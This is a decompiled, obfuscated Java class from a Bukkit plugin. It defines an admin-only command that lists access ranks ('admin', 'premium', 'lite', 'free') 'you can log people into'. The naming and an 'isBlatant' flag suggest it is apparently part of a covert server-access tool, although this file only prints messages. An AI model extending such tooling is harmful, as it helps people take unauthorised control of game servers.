/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.admin;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class ListranksCommand
extends Command {
    public ListranksCommand() {
        ListranksCommand lllllllllllllIIllIIllIIIIllIllII;
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    @Override
    public void execute(Core lllllllllllllIIllIIllIIIIlIlIllI, String lllllllllllllIIllIIllIIIIlIlllII, String[] lllllllllllllIIllIIllIIIIlIllIlI, Player lllllllllllllIIllIIllIIIIlIlIlIl) {
        if (lllllllllllllIIllIIllIIIIlIlIllI.admin.contains(lllllllllllllIIllIIllIIIIlIlIlIl.getName())) {
            lllllllllllllIIllIIllIIIIlIlIlIl.sendMessage(Settings.PREFIX("This is a list of all the ranks you can log people into!"));
            lllllllllllllIIllIIllIIIIlIlIlIl.sendMessage(Settings.INFO("admin"));
            lllllllllllllIIllIIllIIIIlIlIlIl.sendMessage(Settings.INFO("premium"));
            lllllllllllllIIllIIllIIIIlIlIlIl.sendMessage(Settings.INFO("lite"));
            lllllllllllllIIllIIllIIIIlIlIlIl.sendMessage(Settings.INFO("free"));
        } else {
            lllllllllllllIIllIIllIIIIlIlIlIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be an ").append(Settings.RED).append("admin ").append(Settings.WHITE).append("to execute this command"))));
        }
    }
}

